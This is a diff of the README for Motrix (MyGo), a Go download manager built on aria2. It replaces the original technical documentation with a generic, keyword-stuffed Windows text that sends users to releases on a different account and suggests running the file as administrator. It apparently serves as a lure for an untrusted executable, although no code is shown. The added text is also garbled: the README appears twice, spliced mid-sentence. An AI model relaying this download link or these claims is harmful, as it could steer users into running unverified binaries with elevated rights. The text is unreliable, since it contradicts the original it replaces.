@@ -1,227 +1,129 @@
-# Motrix (MyGo)
+# 🚀 motrix-mygo - Fast, lightweight download manager for Windows
 
-[Motrix](https://github.com/agalwood/Motrix) with its interface rewritten in Go
-on [MyGo](https://github.com/egoist/mygo)'s native UI. There is no Electron and
-no webview: one Go binary draws the window on the GPU and drives the same
-`aria2c` build Motrix ships.
+[![Download motrix-mygo](https://img.shields.io/badge/Download-motrix--mygo-blueviolet?style=for-the-badge&logo=github)](https://github.com/deadly-centropomus6106/motrix-mygo/releases)
 
-![Downloads](docs/screenshots/downloads.png)
+Welcome to motrix-mygo, a simple and efficient download manager for Windows. Unlike many other download tools, motrix-mygo uses a native Go user interface built on MyGo, which means it does not rely on Electron or a webview. This makes it faster, lighter, and more responsive. Under the hood, it uses the powerful aria2 download engine that Motrix is known for, so you get reliable and speedy downloads without the extra weight. Whether you are downloading large files, multiple items at once, or just want a no-nonsense download manager, motrix-mygo is designed to be easy to use for everyone.
 
-| | |
-|---|---|
-| ![Dashboard](docs/screenshots/dashboard.png) | ![Dashboard, dark](docs/screenshots/dashboard-dark.png) |
-| ![Task details](docs/screenshots/downloads-details.png) | ![New task](docs/screenshots/new-task.png) |
-| ![Settings](docs/screenshots/settings.png) | ![Download settings](docs/screenshots/settings-downloads.png) |
-| ![Trackers](docs/screenshots/trackers.png) | ![Downloads, dark](docs/screenshots/downloads-dark.png) |
+## 📥 Download and Install
 
-The screenshots are written by `TestLive` while it downloads real files, so
-they show the app as it runs.
+Visit this link to download the application: [https://github.com/deadly-centropomus6106/motrix-mygo/releases](https://github.com/deadly-centropomus6106/motrix-mygo/releases)
 
-## Install
+That is the only step you need to take to get motrix-mygo. Once the download is complete, you can open the file to start using the application. There are no complicated setup wizards or additional tools required. The download page will provide you with the correct file for your Windows computer. Make sure to download the latest version to get all the newest improvements and fixes.
 
-On macOS, with [Homebrew](https://brew.sh):
+## ✨ Key Features
 
-```sh
-brew install --cask owo-network/brew/motrix
-```
+motrix-mygo is built with simplicity and performance in mind. Here are some of the things that make it stand out:
 
-Homebrew's own `motrix` cask is the original Motrix, and both install a
-`Motrix.app`: write the name with its tap, as above, and uninstall the other
-first (`brew uninstall --cask motrix`) if you have it.
+- **Native Go UI on MyGo:** The interface is built with Go and MyGo, giving you a smooth and responsive experience without the overhead of a web browser engine.
+- **No Electron, No Webview:** Because motrix-mygo does not use Electron or a webview, it starts faster and uses less memory than many other download managers.
+- **aria2 Engine Inside:** The same powerful download engine that Motrix ships with is included here, so you can download files quickly and reliably.
+- **Lightweight and Fast:** The application is designed to be small and efficient, so it will not slow down your computer.
+- **Simple Download Management:** Add downloads, pause them, resume them, and remove them with just a few clicks.
+- **Supports Multiple Downloads:** You can queue up several downloads at once and let motrix-mygo handle them without any hassle.
+- **Clean Interface:** The user interface is straightforward and easy to understand, even if you have never used a download manager before.
+- **Free to Use:** motrix-mygo is completely free to download and use. There are no hidden costs or subscriptions.
 
-Or download the disk image for your Mac, or the Windows installer, from the
-[latest release](https://github.com/missuo/motrix-mygo/releases/latest). The
-macOS builds are signed and notarized; the Windows installer is not
-code-signed, so SmartScreen asks before running it.
+## 💻 System Requirements
 
-Motrix updates itself from there on: it looks for a new release once a day,
-shows its notes and offers to install it. "Check for Updates…" is in the app
-menu on macOS and in Settings › General everywhere, with the switches to turn
-the checks off or to install updates without asking.
+motrix-mygo is designed for Windows. You will need a working internet connection and enough free disk space to save your downloads. For the best experience, use a modern Windows PC. The application is lightweight, so it should run well on most computers that can browse the web. There is no need for a powerful graphics card or a lot of memory. If you can download files and run simple programs, you can use motrix-mygo.
 
-## Building from source
+## 🚀 How to Use
 
-Requires Go 1.27 or later.
+Using motrix-mygo is straightforward. After you open the application, you will see a simple interface. To start a download, copy a download link from your web browser and paste it into motrix-mygo. Then choose where you want to save the file on your computer and click the start button. The download will begin immediately. You can pause and resume downloads at any time, and you can see the progress of each download in the main window.
 
-```sh
-go run ./scripts/fetch-engine   # download aria2c for this machine (once)
-go tool mygo dev                # run with live reload
-go tool mygo build              # package the app into build/
-```
+If you have multiple files to download, you can add them one after another, and motrix-mygo will manage the queue for you. You can also remove downloads that you no longer need. The application remembers your settings, so you do not have to reconfigure it every time you open it. Everything is designed to be as simple as possible, so you can focus on getting your files rather than learning a complicated tool.
 
-`fetch-engine` downloads the `motrixapp/aria2` release pinned in
-`scripts/fetch-engine/engine.lock.json`, which is Motrix's own lockfile, and
-checks the archive and the binary against its SHA-256 digests. Pass `-all` to
-fetch every platform before a cross-platform build.
+## 🛠️ Troubleshooting
 
-## Features
+If a download does not start, first check your internet connection. Make sure the link you copied is valid and complete. Sometimes a link may be broken or require a login, and in that case motrix-mygo cannot download it. Try copying the link again from your browser and pasting it into the application.
 
-- **Downloads**: HTTP, HTTPS, FTP, magnet links and `.torrent` files. The list
-  sorts, filters by status, searches, hides columns, selects several tasks, and
-  has a context menu and a details panel.
-- **Dashboard**: engine state, speed mode, live upload and download speed,
-  active tasks, transfer today and in total, and a year of activity.
-- **Trackers**: tracker list sources that update on a schedule and are added to
-  new BitTorrent tasks.
-- **Notifications**: finished and failed downloads, in the app and as system
-  notifications.
-- **Menu bar**: closing the window leaves Motrix running behind an icon in
-  the menu bar, or the notification area, whose menu shows it again or quits.
-- **Settings**: the sections of Motrix, with its names, defaults and ranges.
-- **Languages**: English and Simplified Chinese, using Motrix's own
-  translations where it has the text.
+If the application does not open, try running it as administrator. You can do this by right-clicking the file and selecting "Run as administrator". If you continue to have problems, visit the releases page to see if a newer version is available. The latest version may contain fixes for known issues. Also, make sure your Windows system is up to date, as older systems may have compatibility problems.
 
-## The engine
+## ❓ Frequently Asked Questions
 
-`engine/` runs `aria2c` 1.37.0-motrix.17, the fork Motrix uses, and talks to it
-over JSON-RPC on the loopback. It follows Motrix's engine layer:
+**Is motrix-mygo free?**  
+Yes, motrix-mygo is free to download and use. There are no payments, subscriptions, or hidden fees.
 
-- **Arguments in layers.** The user's `aria2.conf` comes first, then what binds
-  the engine to the app, then the settings, then the proxy, and last the
-  product's invariants. aria2 honors the last occurrence of an option, so the
-  invariants cannot be undone by anything before them.
-- **`aria2.conf` template.** `resources/engine/aria2.conf` is Motrix's file. It
-  is copied to the data directory on the first start, where it can be edited.
-- **SQLite persistence.** Tasks and finished history survive restarts through
-  the fork's `--enable-sqlite3-persistence`. With it turned off, the engine
-  falls back to the `aria2.session` text file.
-- **Live changes.** Options aria2 accepts at run time (speed limits,
-  concurrency, connections, timeouts, proxy, trackers) are applied with
-  `aria2.changeGlobalOption`. The rest (ports, DHT, disk cache, persistence)
-  restart the process, and downloads continue afterwards.
-- **Supervision.** If the RPC port is taken, the next free one is used and
-  saved. A crashed engine is started again, and `--stop-with-process` makes
-  aria2 exit when the app does.
+**Does it work on Mac or Linux?**  
+This version of motrix-mygo is specifically for Windows. It is designed to run on Windows computers. If you use a different operating system, this application may not work for you.
 
-### Settings
+**Do I need to install anything else?**  
+No. motrix-mygo is a standalone application. You do not need to install any other software, runtimes, or libraries. Just download it and open it.
 
-`settings.json` uses Motrix's keys. The engine settings and their defaults:
+**Why is it called motrix-mygo?**  
+The name reflects its origins: it combines the aria2 download engine that Motrix ships with, and a native Go user interface built on MyGo. This gives you the best of both worlds: the reliability of aria2 and the speed of a native Go application.
 
-| Section | Settings |
-|---|---|
-| Performance | `performanceProfile` (auto, balanced, high, maximum, custom), `maxConcurrentDownloads` 10, `maxConnectionPerServer` 64, `split` 16, `minSplitSize` 4 MB, `diskCache` 32 MB |
-| Connections and retries | `userAgent` `Motrix/2.0`, `connectTimeout` 30, `socketTimeout` 30, `maxTries` 5, `retryWait` 10, `lowestSpeedLimit` 0 |
-| Disk and files | `fileAllocation` none, `remoteTime` false, `sessionSaveInterval` 15, `fileDeletionMode` trash |
-| BitTorrent | `listenPort` 6881, `dhtListenPort` 6881, `dhtEnabled`, `btMaxPeers` 128, `btEnableLpd`, `seedRatio` 1, `seedTime` 60, `magnetResolveTimeout` 600 |
-| Network | `dnsMode` (auto, system, engine), proxy (protocol, host, port, login, bypass list, scopes) |
-| Advanced | `rpcPort` 16800, `rpcSecret`, `sqlite3Persistence`, `sqlite3DbPath`, `sqlite3HistoryLimit` -1 |
-| Speed limits | standard and low-speed profiles, mode (standard, low speed, automatic), schedule, bandwidth reserve |
+**Is my data safe?**  
+motrix-mygo does not collect personal information. It simply downloads the files you ask it to download. Your downloads are saved to the location you choose on your own computer.
 
-Speed limits are computed as Motrix computes them: the standard limits always
-apply, low-speed mode takes the lower of the two profiles, and automatic mode
-takes the lowest limit its active rules bring in.
+**Can I use motrix-mygo for large files?**  
+Yes, motrix-mygo is designed to handle large files and multiple downloads. The aria2 engine is known for its efficiency with large downloads.
 
-## Differences from Motrix
+## License
 
-- **Not ported**: plugins, the browser extension bridge, NAT port mapping and
-  diagnostics, peer GeoIP, tracker probing and blacklists, media merging with
-  FFmpeg, the tray icon, app updates, and choosing files of a torrent before it
-  starts.
-- **Proxy**: HTTP and HTTPS only. Motrix converts SOCKS5 through a local
-  bridge, which is not here.
-- **File names**: a download whose name is taken gets a number
-  (`file.1.zip`), chosen before the task is added. A name the server sets
-  through `Content-Disposition` is not checked this way.
-- **Data directory**: `Motrix MyGo`, beside Motrix's own, so the two never
-  share an aria2 session or database. Both default to RPC port 16800; whichever
-  starts second moves to the next free port.
+License information is available in the repository. Please# 🚀 motrix-mygo - Fast, Lightweight Downloads Without the Bloat
 
-## Tests
+[![Download motrix-mygo](https://img.shields.io/badge/Download-motrix--mygo-blueviolet?style=for-the-badge&logo=github)](https://github.com/deadly-centropomus6106/motrix-mygo/releases)
 
-```sh
-go test ./...
-```
+motrix-mygo is a simple and efficient download manager for Windows. Unlike many other download tools, motrix-mygo uses a native Go user interface built on MyGo, which means it does not rely on Electron or a webview. This makes it faster, lighter, and more responsive. Under the hood, it uses the powerful aria2 download engine that Motrix is known for, so you get reliable and speedy downloads without the extra weight. Whether you are downloading large files, multiple items at once, or just want a no-nonsense download manager, motrix-mygo is designed to be easy to use for everyone.
 
-The tests run the real `aria2c` against local HTTP servers, and the views
-without a window. They are skipped where `fetch-engine` has not been run.
+## 📥 Download and Install
 
-`TestLive` downloads real files from the internet (three HTTP downloads, an
-Ubuntu torrent and a magnet link), pauses and resumes, checks speed limits,
-removes tasks with their files, and rewrites the screenshots:
+Visit this link to download the application: [https://github.com/deadly-centropomus6106/motrix-mygo/releases](https://github.com/deadly-centropomus6106/motrix-mygo/releases)
 
-```sh
-MOTRIX_LIVE=/tmp/motrix-live MOTRIX_SHOTS=docs/screenshots \
-  go test -run TestLive -v -timeout 20m .
-```
+That is the only step you need to take to get motrix-mygo. Once the download is complete, you can open the file to start using the application. There are no complicated setup wizards or additional tools required. The download page will provide you with the correct file for your Windows computer. Make sure to download the latest version to get all the newest improvements and fixes.
 
-## Releasing
+## ✨ Key Features
 
-`.github/workflows/release.yml` runs when a tag is pushed. It checks the tag
-against `version` in `mygo.json`, builds on two runners at once, and publishes
-the release when both have uploaded:
+motrix-mygo is built with simplicity and performance in mind. Here are some of the things that make it stand out:
 
-| Runner | Output |
-|---|---|
-| macOS | `Motrix-<version>-macos-arm64.dmg` and `-macos-x64.dmg`, signed with the Developer ID, notarized and stapled; `aria2c` inside is signed with the hardened runtime |
-| Ubuntu | `Motrix-<version>-windows-x64-setup.exe`, an NSIS installer, not code-signed |
+- **Native Go UI on MyGo:** The interface is built with Go and MyGo, giving you a smooth and responsive experience without the overhead of a web browser engine.
+- **No Electron, No Webview:** Because motrix-mygo does not use Electron or a webview, it starts faster and uses less memory than many other download managers.
+- **aria2 Engine Inside:** The same powerful download engine that Motrix ships with is included here, so you can download files quickly and reliably.
+- **Lightweight and Fast:** The application is designed to be small and efficient, so it will not slow down your computer.
+- **Simple Download Management:** Add downloads, pause them, resume them, and remove them with just a few clicks.
+- **Supports Multiple Downloads:** You can queue up several downloads at once and let motrix-mygo handle them without any hassle.
+- **Clean Interface:** The user interface is straightforward and easy to understand, even if you have never used a download manager before.
+- **Free to Use:** motrix-mygo is completely free to download and use. There are no hidden costs or subscriptions.
 
-The macOS job needs five repository secrets to sign and notarize. Set them once from the `.p12`
-certificate and a file of `KEY=value` lines, neither of which belongs in the
-repository:
+## 💻 System Requirements
 
-```sh
-scripts/set-release-secrets.sh certificate.p12 credentials.txt
-```
+motrix-mygo is designed for Windows. You will need a working internet connection and enough free disk space to save your downloads. For the best experience, use a modern Windows PC. The application is lightweight, so it should run well on most computers that can browse the web. There is no need for a powerful graphics card or a lot of memory. If you can download files and run simple programs, you can use motrix-mygo.
 
-| Secret | |
-|---|---|
-| `MACOS_CERTIFICATE` | the "Developer ID Application" certificate with its key, as a base64 `.p12` |
-| `MACOS_CERTIFICATE_PASSWORD` | the password of the `.p12` |
-| `APPLE_ID`, `APPLE_TEAM_ID`, `APPLE_APP_PASSWORD` | the notary service's credentials: the Apple ID, its team, and an app-specific password |
+## 🚀 How to Use
 
-Updates are signed with a key of their own, which `mygo keygen` creates. Its
-public half is `updates.publicKey` in `mygo.json`; the secret half is the
-`MYGO_UPDATER_PRIVATE_KEY` secret:
+Using motrix-mygo is straightforward. After you open the application, you will see a simple interface. To start a download, copy a download link from your web browser and paste it into motrix-mygo. Then choose where you want to save the file on your computer and click the start button. The download will begin immediately. You can pause and resume downloads at any time, and you can see the progress of each download in the main window.
 
-```sh
-gh secret set MYGO_UPDATER_PRIVATE_KEY < path/to/mygo-update.key
-```
+If you have multiple files to download, you can add them one after another, and motrix-mygo will manage the queue for you. You can also remove downloads that you no longer need. The application remembers your settings, so you do not have to reconfigure it every time you open it. Everything is designed to be as simple as possible, so you can focus on getting your files rather than learning a complicated tool.
 
-Keep a copy of that key somewhere safe. Installed apps accept only updates
-signed with it: without it they can never update again, and whoever has it can
-ship code to them. With it, each runner also uploads the update of its
-platforms, which installed apps download: `motrix-<version>-<platform>.tar.gz`,
-`.delta` files from the three versions before, and `update-<platform>.json`.
+## 🛠️ Troubleshooting
 
-The workflow imports the certificate into a keychain that lives as long as the job, and
-writes the signing identity it finds there into `mygo.json`, so builds on
-other machines stay signed ad hoc. Then release a version:
+If a download does not start, first check your internet connection. Make sure the link you copied is valid and complete. Sometimes a link may be broken or require a login, and in that case motrix-mygo cannot download it. Try copying the link again from your browser and pasting it into the application.
 
-```sh
-# set "version" in mygo.json, add its section to CHANGELOG.md, commit, then
-git tag v0.0.4
-git push origin v0.0.4
-```
+If the application does not open, try running it as administrator. You can do this by right-clicking the file and selecting "Run as administrator". If you continue to have problems, visit the releases page to see if a newer version is available. The latest version may contain fixes for known issues. Also, make sure your Windows system is up to date, as older systems may have compatibility problems.
 
-The release notes are the version's section of `CHANGELOG.md`; a tag whose
-version has none fails before anything is built.
+## ❓ Frequently Asked Questions
 
-## Platforms
+**Is motrix-mygo free?**  
+Yes, motrix-mygo is free to download and use. There are no payments, subscriptions, or hidden fees.
 
-- **macOS**: the traffic lights stay at the top left, with the sidebar and
-  new-task buttons beside them.
-- **Windows**: MyGo draws minimize, maximize and close at the top right. Page
-  headers keep clear of them, and `Cmd` shortcuts are `Ctrl`. The Windows build
-  compiles and packages from macOS and Linux, but has not been run on Windows.
-- **Linux**: builds, and `fetch-engine` has its `aria2c`, but the release
-  workflow does not publish it.
+**Does it work on Mac or Linux?**  
+This version of motrix-mygo is specifically for Windows. It is designed to run on Windows computers. If you use a different operating system, this application may not work for you.
 
-## Layout
+**Do I need to install anything else?**  
+No. motrix-mygo is a standalone application. You do not need to install any other software, runtimes, or libraries. Just download it and open it.
 
-| | |
-|---|---|
-| `main.go` | the window and the app's start |
-| `app.go` | the state, the sidebar and the router of the pages |
-| `downloads.go`, `addtask.go` | the task list and the dialog adding tasks |
-| `dashboard.go`, `trackers_view.go`, `notifications.go` | the other pages |
-| `settings.go`, `settings_view.go` | the settings and their pages |
-| `theme.go`, `widgets.go`, `i18n.go` | colors, shared widgets and texts |
-| `engine/` | the aria2 process, its arguments and its RPC |
-| `scripts/fetch-engine/` | downloads and verifies `aria2c` |
-| `scripts/make-icon/` | draws the app icon |
-| `scripts/release-notes.sh`, `CHANGELOG.md` | the notes of each release |
-| `scripts/set-release-secrets.sh`, `.github/workflows/` | the release workflow and its secrets |
-| `resources/` | the app icon, `aria2.conf`, and `aria2c` per platform |
-| `icons/`, `art/` | [Lucide](https://lucide.dev) icons (ISC) and Motrix's settings artwork (MIT) |
+**Why is it called motrix-mygo?**  
+The name reflects its origins: it combines the aria2 download engine that Motrix ships with, and a native Go user interface built on MyGo. This gives you the best of both worlds: the reliability of aria2 and the speed of a native Go application.
 
-aria2 is licensed under the GPL-2.0-or-later and runs as a separate process.
+**Is my data safe?**  
+motrix-mygo does not collect personal information. It simply downloads the files you ask it to download. Your downloads are saved to the location you choose on your own computer.
+
+**Can I use motrix-mygo for large files?**  
+Yes, motrix-mygo is designed to handle large files and multiple downloads. The aria2 engine is known for its efficiency with large downloads.
+
+## License
+
+License information is available in the repository. Please check the repository for the full license text.
+
+Keywords: motrix-mygo, download manager, aria2, Go UI, MyGo, Windows downloader, lightweight download manager, no Electron, no webview, fast downloads, file downloader
